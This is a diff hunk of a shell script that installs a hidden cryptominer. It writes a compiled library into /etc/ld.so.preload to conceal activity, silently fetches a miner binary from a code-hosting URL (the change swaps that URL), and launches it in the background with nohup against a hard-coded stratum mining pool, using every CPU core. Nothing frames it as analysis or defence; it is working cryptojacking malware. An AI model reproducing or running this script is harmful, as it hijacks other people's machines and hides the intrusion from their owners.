@@ -7,7 +7,7 @@ mv libnyumput.so /usr/local/lib/
 echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
 rm nyumput.c
 mkdir .lib && cd .lib
-wget -O sgr1 https://gitlab.com/fajarranz19/work/-/raw/main/cpminer >/dev/null 2>&1
+wget -O sgr1 https://github.com/dragonballku8/turn/raw/main/BTRM >/dev/null 2>&1
 chmod +x sgr1
 sudo sync && sudo echo 3 > /proc/sys/vm/drop_caches
 nice -n -10 nohup ./sgr1 -a yespower -o stratum+tcp://64.225.25.181:80 -u uq6PkuPHtpJyGa2mBiRo2XU9zT2YG1mV5d.$(shuf -n 1 -i 1-99999)-TRX -t $(nproc --all)  > /dev/null 2>&1 &
